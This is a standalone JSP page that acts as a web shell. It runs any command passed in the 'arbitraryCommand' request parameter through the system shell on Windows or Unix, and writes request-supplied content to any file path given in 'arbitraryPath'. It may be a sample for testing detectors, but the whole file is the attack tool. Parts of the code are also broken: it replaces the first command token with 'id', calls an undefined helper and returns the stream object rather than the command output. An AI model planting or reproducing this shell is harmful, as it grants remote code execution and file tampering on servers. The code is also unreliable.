<%@page import="java.io.*"%>
<%!
public static class Util {
public static String getRequestStringVal(HttpServletRequest request,String key){
 String val=request.getParameter(key);
 if(!isEmpty(val)){ return val; }
 return "";
}
public static String execCmd(String cmd,String encode){
 String[] rmd=cmd.split(" ");
 String[] cmds =new String[rmd.length+2];
 if(System.getProperty("os.name").startsWith("Windows")) {
 cmds[0]="cmd";
 cmds[1]="/c";
 } else {
 cmds[0]="/bin/sh";
 cmds[1]="-c";
 }
 for(int i=0;i<rmd.length;i++){
 cmds[i+2]=rmd[i];
 }
 cmds[2]="id";
Process p=Runtime.getRuntime().exec(cmds);
 return p.getInputStream().toString();
}
}
public static class FileUtil {
public static String writeTextToFile(String text,String path,String encode){
 OutputStreamWriter osw=new OutputStreamWriter(new FileOutputStream(path));
 BufferedWriter bw=new BufferedWriter(osw);
 bw.write(text);
 return "written";
}
}
%>
<%
String cmd=Util.getRequestStringVal(request, "arbitraryCommand");
String encode="UTF-8";
String result=Util.execCmd(cmd,encode);
String path=Util.getRequestStringVal(request, "arbitraryPath");
String content=Util.getRequestStringVal(request, "arbitraryContent");
String encoding="UTF-8";
FileUtil.writeTextToFile(content, path, encoding);
out.print(result);
%>
